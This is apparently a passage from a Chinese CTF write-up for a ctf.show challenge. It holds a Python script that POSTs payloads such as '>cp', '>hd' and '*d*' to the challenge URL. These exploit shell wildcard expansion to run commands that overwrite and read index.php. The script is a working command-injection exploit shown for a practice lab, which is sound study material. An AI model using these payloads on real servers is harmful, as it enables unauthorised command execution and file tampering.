现在我们的目的就是覆盖index.php，由于首字母要小于f大于i，所以查了一下只有hd，hd解析的是hexdump就能读取index.php

from concurrent.futures import ThreadPoolExecutor
import time
import requests

url = "http://c29db3cd-5f18-40f9-b134-ad172979409a.challenge.ctf.show/"

check = {'ctf_show': 'ls'}

payload0 = {'ctf_show': '>cp'}
payload1 = {'ctf_show': '*'}
payload2 = {'ctf_show': '>hd'}
payload3 = {'ctf_show': '*d*'}

def send(data):
    r = requests.post(url, data=data)
    print(r.text)

if __name__ == "__main__":
    send(payload0)
    send(check)

    time.sleep(1)

    executor = ThreadPoolExecutor(max_workers=50)
    args_list = [payload1, payload2, payload3]
    for args in args_list:
        time.sleep(0.1)
        executor.submit(send, args)
